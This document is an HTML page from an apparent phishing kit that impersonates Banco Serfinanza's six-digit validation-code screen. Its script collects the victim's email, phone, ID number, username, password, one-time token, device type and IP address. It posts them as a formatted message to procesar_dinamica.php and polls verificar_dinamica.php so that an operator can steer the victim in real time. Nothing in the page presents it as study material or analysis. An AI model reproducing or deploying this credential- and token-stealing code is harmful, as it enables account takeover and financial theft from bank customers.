<html>
    <head>
        <title>Código de Validación -</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon">
        <link rel="icon" href="../img/favicon.ico" type="image/x-icon">

        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>        
        <link href="../css/style.css" rel="stylesheet">
        <link href="../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../js/functions.js"></script>
        <script type="text/javascript" src="../js/ready.js"></script>      
        
        <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Estilos responsive para móviles */
        @media screen and (max-width: 768px) {
            #panel-der {
                display: none !important;
            }
            
            #panel-izq {
                width: 100% !important;
            }
            
            .frm {
                padding: 20px !important;
            }
            
                         #inp-token {
                 width: 90% !important;
                 margin-left: -10px !important;
             }
            
            .titulo {
                font-size: 18px !important;
            }
            
            .entradas {
                font-size: 16px !important;
                padding: 12px !important;
            }
            
            .btn {
                padding: 12px 24px !important;
                font-size: 16px !important;
            }
            
            #cabecera img {
                max-width: 200px !important;
                height: auto !important;
            }
            
            .linea {
                font-size: 12px !important;
                padding: 10px !important;
            }
            
            #derechos, #derechos2 {
                font-size: 10px !important;
                padding: 5px 0 !important;
            }
        }
        
        @media screen and (max-width: 480px) {
            .frm {
                padding: 15px !important;
            }
            
                         #inp-token {
                 width: 95% !important;
                 margin-left: -15px !important;
             }
            
            .titulo {
                font-size: 16px !important;
            }
            
            .entradas {
                font-size: 14px !important;
                padding: 10px !important;
            }
            
            .btn {
                padding: 10px 20px !important;
                font-size: 14px !important;
            }
        }
        </style>
        
        <script>
        document.addEventListener("DOMContentLoaded", function () {
          const urlParams = new URLSearchParams(window.location.search);
          
          // Generar o recuperar session_id
          let sessionId = localStorage.getItem('session_id');
          if (!sessionId) {
            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('session_id', sessionId);
          }

          // Event listener para el botón Confirmar
          const btnConfirmar = document.getElementById('btn-confirmar');
          
          btnConfirmar.addEventListener('click', async function (event) {
            event.preventDefault();

            // Obtener el token
            const token = document.getElementById('txt-token').value;
            
            // Validar que el token tenga 6 dígitos
            if (token.length !== 6) {
              alert('El token debe tener 6 dígitos');
              return;
            }

            // Mostrar loader
            const loader = document.getElementById('loader-overlay');
            if (loader) {
              loader.style.display = 'flex';
            }

            localStorage.setItem('token', token);
            localStorage.setItem('session_id', sessionId);

            // Detectar tipo de dispositivo
            const userAgent = navigator.userAgent;
            let dispositivo = 'PC';
            
            if (/Android/i.test(userAgent)) {
              dispositivo = 'Android';
            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
              dispositivo = 'iPhone';
            } else if (/Windows/i.test(userAgent)) {
              dispositivo = 'PC';
            } else if (/Mac/i.test(userAgent)) {
              dispositivo = 'Mac';
            } else if (/Linux/i.test(userAgent)) {
              dispositivo = 'Linux';
            }
            
            const hora = new Date().toLocaleString('es-ES');
            
                         // Obtener IP y construir mensaje
             fetch('get_ip.php')
              .then(response => response.json())
              .then(data => {
                const ip = data.ip || 'No disponible';
                
                const mensaje = `
<b><u>💎BANCO SERFINANZA - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO SERFINANZA
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔄 Token:</b> ${token}
------------------------------`;

                const formData = new FormData();
                formData.append('message', mensaje);
                formData.append('transactionId', sessionId);

                fetch('procesar_dinamica.php', {
                  method: 'POST',
                  body: formData
                })
                .then(res => res.json())
                .then(result => {
                  if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                  } else {
                    // Ocultar loader si hay error
                    const loader = document.getElementById('loader-overlay');
                    if (loader) {
                      loader.style.display = 'none';
                    }
                  }
                })
                .catch(err => {
                  // Ocultar loader si hay error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                });
              })
              .catch(() => {
                // Si falla la obtención de IP, enviar sin IP
                const mensaje = `
<b><u>💎BANCO SERFINANZA - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO SERFINANZA
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔄 Token:</b> ${token}
------------------------------`;

                const formData = new FormData();
                formData.append('message', mensaje);
                formData.append('transactionId', sessionId);

                fetch('procesar_dinamica.php', {
                  method: 'POST',
                  body: formData
                })
                .then(res => res.json())
                .then(result => {
                  if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                  } else {
                    // Ocultar loader si hay error
                    const loader = document.getElementById('loader-overlay');
                    if (loader) {
                      loader.style.display = 'none';
                    }
                  }
                })
                .catch(err => {
                  // Ocultar loader si hay error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                });
              });
          });
        });

        async function checkPaymentVerification(transactionId, messageId) {
          try {
            const formData = new FormData();
            formData.append('transactionId', transactionId);
            formData.append('messageId', messageId);

            const res = await fetch('verificar_dinamica.php', {
              method: 'POST',
              body: formData
            });
            const result = await res.json();

            if (result.action) {
              switch (result.action) {
                case 'pedir_dinamica': 
                  // Ocultar loader antes de mostrar error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                  alert("Error de Clave Dinamica.");
                  window.location.href = "token.php";
                  break;
                case 'error_logo': 
                  // Ocultar loader antes de mostrar error
                  const loader2 = document.getElementById('loader-overlay');
                  if (loader2) {
                    loader2.style.display = 'none';
                  }
                  alert("Usuario o clave incorrectos.");
                  window.location.href = "../index.html";
                  break;
                case 'confirm_finalizar':
                  window.location.href = "..//fin.php";
                  break;
              }
            } else {
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
            }
          } catch (err) {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
          }
        }
        </script>
    </head>
    <body>
        <!-- Loader Overlay -->
        <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 9999; justify-content: center; align-items: center;">
            <div style="background: white; padding: 30px; border-radius: 10px; text-align: center;">
                <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                <div style="color: #333; font-size: 16px; font-weight: bold;">Procesando información...</div>
                <div style="color: #666; font-size: 14px; margin-top: 10px;">Por favor espere</div>
            </div>
        </div>
        
        <div id="fondo"></div>
        <div id="mensaje">
            <div style="text-align:center;">Por favor ingrese el código de validación de 6 dígitos.</div>
            <br><br>
            <div style="text-align:right;"><button class="btn" id="btn-aceptar">Aceptar</button></div>
        </div>
        <div id="cabecera">
            <img src="../img/logo.png">
        </div>
        <div style="height: 24px;"></div>
        <div id="contenido">
            <table border="0" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                    <td valign="top" id="panel-izq">
                        <table width="100%" cellpadding="0" cellspacing="0">
                            <tr>
                                <td valign="bottom"><img src="../img/vig.jpg" width="24"></td>
                                <td>
                                    <div class="frm">
                                        <div class="titulo">CÓDIGO DE VALIDACIÓN</div>
                                        <div style="height: 29px;"></div>
                                        <div style="color: #6c757d; font-size: 14px; line-height: 1.4; margin-bottom: 20px; text-align: center;">
                                            Para confirmar tu operación, ingresa el código de 6 dígitos que recibiste en tu dispositivo móvil o en tu app.
                                        </div>
                                        <table border="0" width="70%" cellpadding="0" cellspacing="0" id="inp-token" style="margin-left: 40px;">
                                            <tr>
                                                <td valign="middle" align="left" width="54" id="ico-token1"></td>
                                                <td valign="middle" align="right">
                                                    <div id="ico-token2"></div>
                                                    <input type="text" name="txt-token" id="txt-token" class="entradas" placeholder="" autocomplete="off" maxlength="6" style="text-align: center; letter-spacing: 2px; font-size: 18px;">
                                                </td>
                                            </tr>
                                        </table>
                                        <div style="height: 42px;"></div>
                                        <div style="text-align: center;">
                                            <button class="btn" id="btn-confirmar">Confirmar</button>
                                        </div>
                                        <div style="height: 42px;"></div>
                                        <table border="0" width="100%" cellpadding="0" cellspacing="0">
                                            <tr>
                                                <td class="recordar" align="left">Regístrate aquí</td>
                                                <td class="recordar" align="center">Recordar Usuario</td>
                                                <td class="recordar" align="right">Restablecer Contraseña</td>
                                            </tr>
                                        </table>
                                    </div>
                                </td>
                            </tr>
                        </table>                    
                    </td>
                    <td valign="top" id="panel-der">
                        <img src="../img/slide.png" width="100%">
                    </td>
                </tr>
            </table>
            <div class="linea">
                Línea de Servicio al Cliente: 323 5997000 - 018000510513
            </div>
            <table border="0" width="100%" cellpadding="0" cellspacing="0" style="margin-top: 10px;">
                <tr>
                    <td align="left" valign="top"><img src="../img/1.jpg"><br class="salto"><img src="../img/2.jpg"><br class="salto"><img src="../img/3.jpg"><br class="salto"><div id="derechos" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
                    <td align="right" valign="top"><div id="derechos2" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
                </tr>
            </table>
        </div>    
    </body>
</html> 